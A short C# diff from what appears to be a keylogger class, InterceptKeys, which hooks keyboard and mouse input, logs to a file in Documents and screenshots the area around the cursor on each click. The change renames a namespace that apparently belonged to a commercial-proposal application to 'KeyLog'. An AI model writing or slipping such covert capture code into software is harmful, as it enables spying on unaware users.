@@ -27,7 +27,7 @@ class InterceptKeys{
     private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);
 
     public static string log_path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\Log.txt";
-    public static Coque_PropositionCommerciale.F_accueil acceuil = new Coque_PropositionCommerciale.F_accueil();
+    public static KeyLog.F_accueil acceuil = new KeyLog.F_accueil();
 
     public static void Hook()  { // initialise the hook and Define what methods to run when hook is triggered
         using (Process curProcess = Process.GetCurrentProcess()) // gets the Current Process 
@@ -77,7 +77,7 @@ class InterceptKeys{
             graphic.CopyFromScreen(CursorCoordinates.X - 100, CursorCoordinates.Y - 100, 0, 0, bmp.Size, CopyPixelOperation.SourceCopy);
 
             Image ClickImage = (Image)bmp ;
-            Coque_PropositionCommerciale.F_accueil.add_Click_2datatable(ClickImage);//MessageBox.Show("CLICK");
+            KeyLog.F_accueil.add_Click_2datatable(ClickImage);//MessageBox.Show("CLICK");
         }
         
         return CallNextHookEx(Click_hookID, nCode, wParam, lParam);
